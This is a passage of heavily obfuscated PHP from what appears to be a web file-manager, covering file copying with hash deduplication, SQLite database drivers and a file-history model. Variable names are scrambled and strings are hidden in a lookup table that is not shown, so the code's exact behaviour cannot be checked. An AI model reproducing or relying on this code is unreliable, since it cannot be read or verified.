$this->fileHistory($”Ğ¶Ö„, $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]], $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[90]]); if ($ÂûÆÅòÃ) { $ïôø¹ÅÊ[$ÀÃ¾Ò¤[568]][] = $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]]; } continue; } else { if ($ï¾Òú‹‰ == REPEAT_RENAME) { $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]] = $this->fileNameAutoCache($ÒŞèòÒÎ, $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]], $ï¾Òú‹‰, !1); } } } } if (!$Á¨©‹ÜÖ[$ÀÃ¾Ò¤[416]] && $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]] == 0) { continue; } if (!$Á¨©‹ÜÖ[$ÀÃ¾Ò¤[416]] && $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]]) { $ïôø¹ÅÊ[$ÀÃ¾Ò¤[568]][] = $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]]; } $Óş‚ÓĞâ[] = $this->_makeItemData($Á¨©‹ÜÖ, $¨ôñÅ°º, $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]]); } unset($Á¨©‹ÜÖ); if (!empty($Óş‚ÓĞâ)) { $this->addAll($Óş‚ÓĞâ); $this->_childrenListSelect($ÒŞèòÒÎ); } $ÕÌ´¿»¾ = $this->_childrenList($ÒŞèòÒÎ); $ÕÌ´¿»¾ = array_to_keyvalue($ÕÌ´¿»¾, $ÀÃ¾Ò¤[32]); foreach ($Æû™â“Ş as $Á¨©‹ÜÖ) { $”Ğ¶Ö„ = $ÕÌ´¿»¾[$Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]]]; $¦Ğ“¶ = $”Ğ¶Ö„[$ÀÃ¾Ò¤[408]]; $this->_copyApplyMeta($”Ğ¶Ö„, $ïôø¹ÅÊ); if ($Á¨©‹ÜÖ[$ÀÃ¾Ò¤[33]] == $ÀÃ¾Ò¤[89]) { $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[88]] = $œû˜¯½ä->getPathInner($Á¨©‹ÜÖ[$ÀÃ¾Ò¤[88]]); $this->_copyChildTo($œû˜¯½ä, $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[88]], $¦Ğ“¶, $ï¾Òú‹‰, $ïôø¹ÅÊ, $…úåÏè°); } } } private function _addFiles($çÌŞ˜§–, $×’‡äó, $É…‚¸×’) { $Ûø‚Ùù” =& $_SERVER[¯µç›È¢]; if (!$×’‡äó || count($×’‡äó) == 0) { return array(); } $¯‹”œ¥Ì = array(); foreach ($×’‡äó as &$‰´©Ê…µ) { Hook::trigger($Ûø‚Ùù”[609], $‰´©Ê…µ); $‰´©Ê…µ[$Ûø‚Ùù”[88]] = $çÌŞ˜§–->getPathInner($‰´©Ê…µ[$Ûø‚Ùù”[88]]); $Œ÷„Î‰ï = $çÌŞ˜§–->hashSimple($‰´©Ê…µ[$Ûø‚Ùù”[88]]); $Àıì€°Œ = $çÌŞ˜§–->hashMd5($‰´©Ê…µ[$Ûø‚Ùù”[88]]); if (strlen($Àıì€°Œ) > 10 && !isset($¯‹”œ¥Ì[$Àıì€°Œ])) { $¯‹”œ¥Ì[$Àıì€°Œ] = array(); } $‰´©Ê…µ[$Ûø‚Ùù”[184]] = $Œ÷„Î‰ï; $‰´©Ê…µ[$Ûø‚Ùù”[183]] = $Àıì€°Œ; Hook::trigger($Ûø‚Ùù”[610], $‰´©Ê…µ); $¯‹”œ¥Ì[$Àıì€°Œ][] =& $‰´©Ê…µ; if (count($¯‹”œ¥Ì[$Àıì€°Œ]) > 1) { $‰´©Ê…µ[$Ûø‚Ùù”[608]] = !0; } } unset($‰´©Ê…µ); $íéşæş€ = array($Ûø‚Ùù”[183] => array($Ûø‚Ùù”[7], array_keys($¯‹”œ¥Ì))); $€‹º§ç’ = Model($Ûø‚Ùù”[611]); $Öé‘³÷æ = $€‹º§ç’->where($íéşæş€)->select(); $Öé‘³÷æ = $Öé‘³÷æ ? $Öé‘³÷æ : array(); foreach ($Öé‘³÷æ as $æîÉø¯¶) { if (!isset($¯‹”œ¥Ì[$æîÉø¯¶[$Ûø‚Ùù”[183]]])) { continue; } $ğ¥¡•ÈÙ = $¯‹”œ¥Ì[$æîÉø¯¶[$Ûø‚Ùù”[183]]]; foreach ($ğ¥¡•ÈÙ as &$‰´©Ê…µ) { $‰´©Ê…µ[$Ûø‚Ùù”[472]] = $æîÉø¯¶[$Ûø‚Ùù”[472]]; $‰´©Ê…µ[$Ûø‚Ùù”[608]] = !0; } unset($‰´©Ê…µ); } $¿ñ…æÇÕ = array(); foreach ($×’‡äó as $³¸©£¿¥) { if (isset($³¸©£¿¥[$Ûø‚Ùù”[608]]) && $³¸©£¿¥[$Ûø‚Ùù”[608]]) { continue; } $ï›—ê = $çÌŞ˜§–->getPathInner($³¸©£¿¥[$Ûø‚Ùù”[88]]); $¹ğÅ‰µ² = $€‹º§ç’->addFileMake($ï›—ê, $³¸©£¿¥[$Ûø‚Ùù”[90]], $³¸©£¿¥[$Ûø‚Ùù”[184]], $³¸©£¿¥[$Ûø‚Ùù”[183]], $³¸©£¿¥[$Ûø‚Ùù”[32]], $É…‚¸×’); if (!is_array($¹ğÅ‰µ²)) { continue; } $¿ñ…æÇÕ[] = $¹ğÅ‰µ²; } $€‹º§ç’->addAll($¿ñ…æÇÕ); $íéşæş€ = array($Ûø‚Ùù”[183] => array($Ûø‚Ùù”[7], array_keys($¯‹”œ¥Ì))); $Öé‘³÷æ = $€‹º§ç’->where($íéşæş€)->select(); $Öé‘³÷æ = $Öé‘³÷æ ? $Öé‘³÷æ : array(); foreach ($Öé‘³÷æ as $æîÉø¯¶) { if (!isset($¯‹”œ¥Ì[$æîÉø¯¶[$Ûø‚Ùù”[183]]])) { continue; } $³Ğìû‹ =& $¯‹”œ¥Ì[$æîÉø¯¶[$Ûø‚Ùù”[183]]]; foreach ($³Ğìû‹ as &$‰´©Ê…µ) { $‰´©Ê…µ[$Ûø‚Ùù”[472]] = $æîÉø¯¶[$Ûø‚Ùù”[472]]; } unset($‰´©Ê…µ); } $‡¦º¡–× = array(); foreach ($×’‡äó as $«ùÂ—ô) { $‡¦º¡–×[$«ùÂ—ô[$Ûø‚Ùù”[32]]] = $«ùÂ—ô; } return $‡¦º¡–×; } } goto bÕÄæ¯èÉ; a¢¥ˆÖ‡æ : class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ƒŞÂ°² =& $_SERVER[¯µç›È¢]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ƒŞÂ°²[6]] =& $config; $this->values[$ƒŞÂ°²[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ƒŞÂ°²[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($“Ó•àÛŸ) { if (1 === func_num_args()) { $this->{$“Ó•àÛŸ} = new $“Ó•àÛŸ(); } else { $‚”¸úû¿ = new ReflectionClass($“Ó•àÛŸ); $ªõ¤øşÑ = func_get_args(); array_shift($ªõ¤øşÑ); $this->{$“Ó•àÛŸ} = $‚”¸úû¿->newInstanceArgs($ªõ¤øşÑ); } return $this->{$“Ó•àÛŸ}; } public function routeBind($æÎ¶¹Ñ, $óÍĞãÌë, $ÁÆ‚éşì = 3) { $¹‘ŸŠØ =& $_SERVER[¯µç›È¢]; $íÕÂô° = $this->in[$¹‘ŸŠØ[9]]; $æÎ¶¹Ñ = str_replace($¹‘ŸŠØ[10], $¹‘ŸŠØ[11], trim(trim($æÎ¶¹Ñ, $¹‘ŸŠØ[8]), $¹‘ŸŠØ[12])); if (!$æÎ¶¹Ñ || count($íÕÂô°) <= $ÁÆ‚éşì) { return !1; } $Ú‰êà£® = !0; $½µÏäéò = explode($¹‘ŸŠØ[8], $æÎ¶¹Ñ); for ($Ü“÷—Ü› = 0; $Ü“÷—Ü› < count($½µÏäéò); $Ü“÷—Ü›++) { if ($½µÏäéò[$Ü“÷—Ü›] != $íÕÂô°[$ÁÆ‚éşì + $Ü“÷—Ü›]) { $Ú‰êà£® = !1; break; } } if (!$Ú‰êà£®) { return; } call_user_func_array(array($this, $óÍĞãÌë), array()); } public function routeArgs($™§šÚŸò = 3) { $Ú±ñ£º = $this->in[$_SERVER[¯µç›È¢][9]]; if (count($Ú±ñ£º) <= $™§šÚŸò) { return array(); } $Ü×Ü£è = array(); for ($ÂºöÆğ’ = $™§šÚŸò; $ÂºöÆğ’ < count($Ú±ñ£º); $ÂºöÆğ’ += 2) { $Ü×Ü£è[$Ú±ñ£º[$ÂºöÆğ’]] = $Ú±ñ£º[$ÂºöÆğ’ + 1]; $this->in[$Ú±ñ£º[$ÂºöÆğ’]] = $Ú±ñ£º[$ÂºöÆğ’ + 1]; } return $Ü×Ü£è; } protected function assign($‹œ…ñ£Õ, $Ò‘Şµë) { $this->values[$‹œ…ñ£Õ] = $Ò‘Şµë; } protected function display($…²ºœ§Ï) { ob_end_clean(); extract($this->values); require $this->tpl . $…²ºœ§Ï; } } class DbSqliteBase extends Db { public function __construct($‘œ³Õûµ = '') { $‚ áñ– =& $_SERVER[¯µç›È¢]; if (!extension_loaded($‚ áñ–[13])) { think_exception(think_lang($‚ áñ–[14]) . $‚ áñ–[15]); } if (!empty($‘œ³Õûµ)) { if (!isset($‘œ³Õûµ[$‚ áñ–[16]])) { $‘œ³Õûµ[$‚ áñ–[16]] = 438; } $this->config = $‘œ³Õûµ; if (empty($this->config[$‚ áñ–[17]])) { $this->config[$‚ áñ–[17]] = array(); } } } public function connect($àšş¨ÙŸ = '', $ƒÔŞÃ«Í = 0) { $©¬§¹´ô =& $_SERVER[¯µç›È¢]; if (!isset($this->linkID[$ƒÔŞÃ«Í])) { if (empty($àšş¨ÙŸ)) { $àšş¨ÙŸ = $this->config; } $íì½ƒ‡š = !empty($àšş¨ÙŸ[$©¬§¹´ô[17]][$©¬§¹´ô[18]]) ? $àšş¨ÙŸ[$©¬§¹´ô[17]][$©¬§¹´ô[18]] : $this->pconnect; $­š•Óãä = $íì½ƒ‡š ? $©¬§¹´ô[19] : $©¬§¹´ô[20]; $this->linkID[$ƒÔŞÃ«Í] = $­š•Óãä($àšş¨ÙŸ[$©¬§¹´ô[21]], $àšş¨ÙŸ[$©¬§¹´ô[16]]); if (!$this->linkID[$ƒÔŞÃ«Í]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ƒÔŞÃ«Í], 30000); if (1 != think_config($©¬§¹´ô[22])) { unset($this->config); } } return $this->linkID[$ƒÔŞÃ«Í]; } public function free() { $this->queryID = null; } public function query($’Ú€áĞÕ) { $¶ŸœÁ“ =& $_SERVER[¯µç›È¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $’Ú€áĞÕ; if ($this->queryID) { $this->free(); } think_action_status($¶ŸœÁ“[23], 1); think_status($¶ŸœÁ“[24]); $this->queryID = sqlite_query($this->_linkID, $’Ú€áĞÕ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ìØôµã³ = $this->getAll(); return $ìØôµã³; } } public function execute($Şİ—İ¿) { $¡äÎÀ›ó =& $_SERVER[¯µç›È¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Şİ—İ¿; if ($this->queryID) { $this->free(); } think_action_status($¡äÎÀ›ó[25], 1); think_status($¡äÎÀ›ó[24]); $ÍÎéíÃŸ = sqlite_exec($this->_linkID, $Şİ—İ¿); $this->debug(); if (!1 === $ÍÎéíÃŸ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¯µç›È¢][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $«£ÛƒÏ” = sqlite_query($this->_linkID, $_SERVER[¯µç›È¢][27]); if (!$«£ÛƒÏ”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $àìŸÛÕ® = sqlite_query($this->_linkID, $_SERVER[¯µç›È¢][28]); if (!$àìŸÛÕ®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ñÎòÆõ = array(); if ($this->numRows > 0) { for ($Š¤­Ó¼ = 0; $Š¤­Ó¼ < $this->numRows; $Š¤­Ó¼++) { $ñÎòÆõ[$Š¤­Ó¼] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ñÎòÆõ; } public function getFields($»€‘ï§ù) { $ä‡‡¾·î =& $_SERVER[¯µç›È¢]; $°ÅŸ·úĞ = $this->query($ä‡‡¾·î[29] . $»€‘ï§ù . $ä‡‡¾·î[30]); $êÊ·µ÷û = array(); if ($°ÅŸ·úĞ) { foreach ($°ÅŸ·úĞ as $®àÅÜ×· => $–êİÜŠ³) { $êÊ·µ÷û[$–êİÜŠ³[$ä‡‡¾·î[31]]] = array($ä‡‡¾·î[32] => $–êİÜŠ³[$ä‡‡¾·î[31]], $ä‡‡¾·î[33] => $–êİÜŠ³[$ä‡‡¾·î[34]], $ä‡‡¾·î[35] => (bool) ($–êİÜŠ³[$ä‡‡¾·î[36]] === $ä‡‡¾·î[12]), $ä‡‡¾·î[37] => $–êİÜŠ³[$ä‡‡¾·î[38]], $ä‡‡¾·î[39] => strtolower($–êİÜŠ³[$ä‡‡¾·î[40]]) == $ä‡‡¾·î[41], $ä‡‡¾·î[42] => strtolower($–êİÜŠ³[$ä‡‡¾·î[43]]) == $ä‡‡¾·î[44]); } } return $êÊ·µ÷û; } public function getTables($ı¾²÷Îæ = '') { $„‰‚«Á° =& $_SERVER[¯µç›È¢]; $ÑõŞù…À = $this->query($„‰‚«Á°[45] . $„‰‚«Á°[46] . $„‰‚«Á°[47]); $Ñ×ğ¢É× = array(); foreach ($ÑõŞù…À as $¸Â«¡ í => $ò€€°øˆ) { $Ñ×ğ¢É×[$¸Â«¡ í] = current($ò€€°øˆ); } return $Ñ×ğ¢É×; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $³Úä¤ã© =& $_SERVER[¯µç›È¢]; $˜’õñå = sqlite_last_error($this->_linkID); $this->error = $˜’õñå . $³Úä¤ã©[4] . sqlite_error_string($˜’õñå); if ($³Úä¤ã©[12] != $this->queryStr) { $this->error .= LNG($³Úä¤ã©[48]) . $this->queryStr; } think_trace($this->error, $³Úä¤ã©[12], $³Úä¤ã©[49]); return $this->error; } public function escapeString($×½Ü“€Ê) { return sqlite_escape_string($×½Ü“€Ê); } public function parseLimit($íèºÑò) { $µ©¢¡Ã =& $_SERVER[¯µç›È¢]; $ „Ò Ì = $µ©¢¡Ã[12]; if (!empty($íèºÑò)) { $íèºÑò = explode($µ©¢¡Ã[50], $íèºÑò); if (count($íèºÑò) > 1) { $ „Ò Ì .= $µ©¢¡Ã[51] . $íèºÑò[1] . $µ©¢¡Ã[52] . $íèºÑò[0] . $µ©¢¡Ã[53]; } else { $ „Ò Ì .= $µ©¢¡Ã[51] . $íèºÑò[0] . $µ©¢¡Ã[53]; } } return $ „Ò Ì; } } class DbSqlite3Base extends Db { public function __construct($·ˆêÒÓÄ = '') { $¸µü’™ı =& $_SERVER[¯µç›È¢]; if (!class_exists($¸µü’™ı[54])) { think_exception(think_lang($¸µü’™ı[14]) . $¸µü’™ı[55]); } if (!empty($·ˆêÒÓÄ)) { if (!isset($·ˆêÒÓÄ[$¸µü’™ı[16]])) { $·ˆêÒÓÄ[$¸µü’™ı[16]] = 438; } $this->config = $·ˆêÒÓÄ; if (empty($this->config[$¸µü’™ı[17]])) { $this->config[$¸µü’™ı[17]] = array(); } } } public function connect($ËåÈ¢Î® = '', $ÖÌÜ²ß = 0) { $Ô­–©ùí =& $_SERVER[¯µç›È¢]; if (!isset($this->linkID[$ÖÌÜ²ß])) { if (empty($ËåÈ¢Î®)) { $ËåÈ¢Î® = $this->config; } $this->linkID[$ÖÌÜ²ß] = new SQLite3($ËåÈ¢Î®[$Ô­–©ùí[21]]); if (!$this->linkID[$ÖÌÜ²ß]) { think_exception($this->linkID[$ÖÌÜ²ß]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÖÌÜ²ß]->busyTimeout(30000); if (1 != think_config($Ô­–©ùí[22])) { unset($this->config); } } return $this->linkID[$ÖÌÜ²ß]; } public function free() { $this->queryID = null; } public function query($ƒ°Ø»ö§) { $…çÈŠÔö =& $_SERVER[¯µç›È¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ°Ø»ö§; if ($this->queryID) { $this->free(); } think_action_status($…çÈŠÔö[23], 1); think_status($…çÈŠÔö[24]); $this->queryID = $this->_linkID->query($ƒ°Ø»ö§); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ã·Á‰Ö´ = $this->getAll(); $this->numRows = count($ã·Á‰Ö´); return $ã·Á‰Ö´; } } public function execute($Ó‹ùö€ê) { $ö¿Š»İ =& $_SERVER[¯µç›È¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ó‹ùö€ê; if ($this->queryID) { $this->free(); } think_action_status($ö¿Š»İ[25], 1); think_status($ö¿Š»İ[24]); $£·èÏÈ× = $this->_linkID->exec($Ó‹ùö€ê); $this->debug(); if (!1 === $£·èÏÈ×) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¯µç›È¢][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğã°ï´ = $this->_linkID->query($_SERVER[¯µç›È¢][27]); if (!$ğã°ï´) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $‘©˜ÔÌç = $this->_linkID->query($_SERVER[¯µç›È¢][28]); if (!$‘©˜ÔÌç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $”˜µÀ·Ô = array(); while ($å¯–õû = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $”˜µÀ·Ô[] = $å¯–õû; } $this->queryID->reset(); return $”˜µÀ·Ô; } public function getFields($ğØƒÇü) { $ôŸŞ¨ˆğ =& $_SERVER[¯µç›È¢]; $÷í°ï¯˜ = $this->query($ôŸŞ¨ˆğ[29] . $ğØƒÇü . $ôŸŞ¨ˆğ[30]); $ı‡ ÁÄ¤ = array(); if ($÷í°ï¯˜) { foreach ($÷í°ï¯˜ as $í¦ğûÔª => $…îé¹») { $ı‡ ÁÄ¤[$…îé¹»[$ôŸŞ¨ˆğ[32]]] = array($ôŸŞ¨ˆğ[32] => $…îé¹»[$ôŸŞ¨ˆğ[32]], $ôŸŞ¨ˆğ[33] => $…îé¹»[$ôŸŞ¨ˆğ[33]], $ôŸŞ¨ˆğ[35] => (bool) ($…îé¹»[$ôŸŞ¨ˆğ[35]] === $ôŸŞ¨ˆğ[12]), $ôŸŞ¨ˆğ[37] => $…îé¹»[$ôŸŞ¨ˆğ[56]], $ôŸŞ¨ˆğ[39] => (bool) $…îé¹»[$ôŸŞ¨ˆğ[57]], $ôŸŞ¨ˆğ[42] => (bool) $…îé¹»[$ôŸŞ¨ˆğ[57]]); } } return $ı‡ ÁÄ¤; } public function getTables($»ø½ßòÜ = '') { $‡ƒ¶ŠÙ¬ =& $_SERVER[¯µç›È¢]; $ğñ¢ÍÑ = $this->query($‡ƒ¶ŠÙ¬[45] . $‡ƒ¶ŠÙ¬[46] . $‡ƒ¶ŠÙ¬[47]); $¥†®…ä = array(); foreach ($ğñ¢ÍÑ as $ÜÓœÜ…Ç => $àÀì Õ÷) { $¥†®…ä[$ÜÓœÜ…Ç] = current($àÀì Õ÷); } return $¥†®…ä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ûàï“¾ =& $_SERVER[¯µç›È¢]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ûàï“¾[12] != $this->queryStr) { $this->error .= LNG($Ûàï“¾[48]) . $this->queryStr; } think_trace($this->error, $Ûàï“¾[12], $Ûàï“¾[49]); return $this->error; } public function escapeString($ŸÁ¨˜çš) { $®÷ù–‰ =& $_SERVER[¯µç›È¢]; if ($this->_linkID) { return $this->_linkID->escapeString($ŸÁ¨˜çš); } return str_ireplace($®÷ù–‰[58], $®÷ù–‰[59], $ŸÁ¨˜çš); } public function parseLimit($ñ››“¯¥) { $¢™¨ç =& $_SERVER[¯µç›È¢]; $ç¬¥º„Ê = $¢™¨ç[12]; if (!empty($ñ››“¯¥)) { $ñ››“¯¥ = explode($¢™¨ç[50], $ñ››“¯¥); if (count($ñ››“¯¥) > 1) { $ç¬¥º„Ê .= $¢™¨ç[51] . $ñ››“¯¥[1] . $¢™¨ç[52] . $ñ››“¯¥[0] . $¢™¨ç[53]; } else { $ç¬¥º„Ê .= $¢™¨ç[51] . $ñ››“¯¥[0] . $¢™¨ç[53]; } } return $ç¬¥º„Ê; } } goto E·ÖÈ„½Íø; BÜÍ¢ß™‹Ñ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\143\145\x5f\150\x69\163\x74\157\x72\x79"; public function historyCount($³Áê²æˆ) { $öÖŞŞåÁ =& $_SERVER[¯µç›È¢]; if (!$³Áê²æˆ) { return array(); } if (is_string($³Áê²æˆ) || is_int($³Áê²æˆ)) { $³Áê²æˆ = array($³Áê²æˆ); } $ö—õõ¢˜ = array($öÖŞŞåÁ[408], $öÖŞŞåÁ[1866] => $öÖŞŞåÁ[505]); $Ò€ÄŞ³á = array($öÖŞŞåÁ[408] => array($öÖŞŞåÁ[7], $³Áê²æˆ)); $‰ßµ°åÉ = $this->field($ö—õõ¢˜)->where($Ò€ÄŞ³á)->group($öÖŞŞåÁ[408])->select(); return array_to_keyvalue($‰ßµ°åÉ, $öÖŞŞåÁ[408], $öÖŞŞåÁ[505]); } public function addHistory($‹ØÀ¹, $š¨‰×˜ = '') { $ıçá²µÏ =& $_SERVER[¯µç›È¢]; $«íë²Ì = array($ıçá²µÏ[423] => $‹ØÀ¹[$ıçá²µÏ[408]], $ıçá²µÏ[1657] => isset($‹ØÀ¹[$ıçá²µÏ[459]]) ? $‹ØÀ¹[$ıçá²µÏ[459]] : $‹ØÀ¹[$ıçá²µÏ[457]], $ıçá²µÏ[473] => $‹ØÀ¹[$ıçá²µÏ[472]], $ıçá²µÏ[587] => $‹ØÀ¹[$ıçá²µÏ[90]], $ıçá²µÏ[2069] => $š¨‰×˜); $¤‚îàÕ = $GLOBALS[$ıçá²µÏ[6]][$ıçá²µÏ[100]][$ıçá²µÏ[1219]]; if ($¤‚îàÕ > 1) { $this->historyAutoClear($«íë²Ì[$ıçá²µÏ[408]]); $this->add($«íë²Ì); } Hook::trigger($ıçá²µÏ[2070], $«íë²Ì); Model($ıçá²µÏ[2071])->eventFileEdit($‹ØÀ¹[$ıçá²µÏ[408]]); } private function historyAutoClear($íÇñóª½) { $¦İñëğ =& $_SERVER[¯µç›È¢]; $€ïÒ‹© = Model($¦İñëğ[787])->get($¦İñëğ[1241]); $öôöøôˆ = $GLOBALS[$¦İñëğ[6]][$¦İñëğ[100]][$¦İñëğ[1219]]; $±·ÄÃÖá = $€ïÒ‹© == $¦İñëğ[1242] ? 5 : $öôöøôˆ; if ($öôöøôˆ <= 1) { $±·ÄÃÖá = 1; } if ($±·ÄÃÖá >= 500) { return; } $ïÈ­âö = array($¦İñëğ[423] => $íÇñóª½); $ÇÀÚÜíƒ = $this->field($¦İñëğ[2072])->where($ïÈ­âö)->order($¦İñëğ[2066])->select(); if (!$ÇÀÚÜíƒ || $±·ÄÃÖá >= count($ÇÀÚÜíƒ)) { return; } $§¥§°÷õ = array_to_keyvalue($ÇÀÚÜíƒ, $¦İñëğ[12], $¦İñëğ[405]); $§¥§°÷õ = array_slice($§¥§°÷õ, $±·ÄÃÖá); $ŞŒÏÜË = array_to_keyvalue($ÇÀÚÜíƒ, $¦İñëğ[12], $¦İñëğ[472]); $ŞŒÏÜË = array_slice($ŞŒÏÜË, $±·ÄÃÖá); if (!$§¥§°÷õ || !$ŞŒÏÜË) { return; } $ïÈ­âö = array($¦İñëğ[425] => array($¦İñëğ[7], $§¥§°÷õ)); $this->where($ïÈ­âö)->delete(); Model($¦İñëğ[475])->remove($ŞŒÏÜË); } public function listData($ğ‘ªõ×) { $¦²ø†”¡ =& $_SERVER[¯µç›È¢]; $ºƒÀš‰ = array($¦²ø†”¡[423] => $ğ‘ªõ×); $ê‹™À¥ = $¦²ø†”¡[2073]; $í§œĞÆ = $this->field($ê‹™À¥)->where($ºƒÀš‰)->order($¦²ø†”¡[2066])->selectPage(); $this->_listAppendUser($í§œĞÆ[$¦²ø†”¡[377]]); $¥ëçÍöŠ = Model($¦²ø†”¡[787])->get($¦²ø†”¡[1241]); $´ÓŸ÷¨æ = 5; if ($¥ëçÍöŠ == $¦²ø†”¡[1242]) { $í§œĞÆ[$¦²ø†”¡[377]] = array_slice($í§œĞÆ[$¦²ø†”¡[377]], 0, $´ÓŸ÷¨æ); $í§œĞÆ[$¦²ø†”¡[374]] = array($¦²ø†”¡[2074] => 1, $¦²ø†”¡[2075] => 20, $¦²ø†”¡[2076] => 1, $¦²ø†”¡[2077] => count($í§œĞÆ[$¦²ø†”¡[377]])); } return $í§œĞÆ; } protected function _listAppendUser(&$™ª¾‚Øœ) { $´ü˜ÏÓ =& $_SERVER[¯µç›È¢]; $¢”’‡½ = array_to_keyvalue($™ª¾‚Øœ, $´ü˜ÏÓ[12], $´ü˜ÏÓ[1666]); $òòŒ·ä = Model($´ü˜ÏÓ[546])->userListInfo($¢”’‡½); foreach ($™ª¾‚Øœ as &$„Ú·°É±) { $©‡É³×ç = $„Ú·°É±[$´ü˜ÏÓ[1666]]; $„Ú·°É±[$´ü˜ÏÓ[457]] = $òòŒ·ä[$©‡É³×ç] ? $òòŒ·ä[$©‡É³×ç] : !1; } unset($„Ú·°É±); } public function fileInfo($ñí’È¯) { $ÂÈ¨”ì =& $_SERVER[¯µç›È¢]; $ŠÕÔàõ¡ = $this->tablePrefix; $ë—µ’¡È = "{$ŠÕÔàõ¡}\151\x6f\137\x66\151\x6c\145\40\x66\x69\x6c\145\163\40\157\156\40\146\151\154\145\x73\x2e\x66\151\x6c\145\x49\x44\40\75\40\x68\151\163\164\157\x72\171\56\146\x69\x6c\145\x49\104"; return $this->alias($ÂÈ¨”ì[2078])->where(array($ÂÈ¨”ì[425] => $ñí’È¯))->join($ë—µ’¡È, $ÂÈ¨”ì[2079])->find(); } public function removeItem($å—ğ›Çá) { $ôĞÑºâÇ =& $_SERVER[¯µç›È¢]; $‡ïç±©İ = array($ôĞÑºâÇ[425] => $å—ğ›Çá); $¥Ôìë‹ = $this->where($‡ïç±©İ)->find(); if ($¥Ôìë‹) { $ÁË±ñá¸ = $this->where($‡ïç±©İ)->delete(); Model($ôĞÑºâÇ[475])->remove($¥Ôìë‹[$ôĞÑºâÇ[472]]); return $ÁË±ñá¸; } return !1; } public function removeBySource($€‚±¤¬) { $Ê¹ñ·Á =& $_SERVER[¯µç›È¢]; if (!$€‚±¤¬) { return !1; } if (!is_array($€‚±¤¬)) { $€‚±¤¬ = array($€‚±¤¬); } $ğ³†¿½ª = array($Ê¹ñ·Á[423] => array($Ê¹ñ·Á[7], $€‚±¤¬)); $‡Óæº®î = $this->field($Ê¹ñ·Á[473])->where($ğ³†¿½ª)->select(); if ($‡Óæº®î) { $this->where($ğ³†¿½ª)->delete(); $¤ú×½œÂ = array_to_keyvalue($‡Óæº®î, $Ê¹ñ·Á[12], $Ê¹ñ·Á[472]); Model($Ê¹ñ·Á[475])->remove($¤ú×½œÂ); } return !0; } public function setDetail($Çßí¾ç„, $çÖí¹†ù) { $¢¤¬¤úå =& $_SERVER[¯µç›È¢]; return $this->where(array($¢¤¬¤úå[425] => $Çßí¾ç„))->save(array($¢¤¬¤úå[2069] => $çÖí¹†ù)); } public function rollbackToItem($¢‰øö› , $öã©°) { $Óœ‘ë¤İ =& $_SERVER[¯µç›È¢]; $ùÃø÷„ó = Model($Óœ‘ë¤İ[842])->sourceInfo($¢‰øö› ); $this->addHistory($ùÃø÷„ó, LNG($Óœ‘ë¤İ[2080])); $èı—¯° = $this->find($öã©°); $Å§ãŠ½„ = array($Óœ‘ë¤İ[472] => $èı—¯°[$Óœ‘ë¤İ[472]], $Óœ‘ë¤İ[90] => $èı—¯°[$Óœ‘ë¤İ[90]], $Óœ‘ë¤İ[96] => time(), $Óœ‘ë¤İ[459] => USER_ID); Model($Óœ‘ë¤İ[842])->where(array($Óœ‘ë¤İ[408] => $¢‰øö› ))->save($Å§ãŠ½„); return $this->where(array($Óœ‘ë¤İ[425] => $öã©°))->delete(); } public function clearSame($Ôº´ÕÎ») { $Í§¾ßõ =& $_SERVER[¯µç›È¢]; $øÜÚŠ½î = $this->listData($Ôº´ÕÎ»); $”êŒµ˜´ = array_to_keyvalue_group($øÜÚŠ½î, $Í§¾ßõ[472]); $ËïÈÅÂ¡ = array(); $÷£åúŞ™ = array(); foreach ($”êŒµ˜´ as $úİºöš¹) { if (!$úİºöš¹ || count($úİºöš¹) <= 1) { continue; } foreach ($úİºöš¹ as $û¥øÕÄõ) { 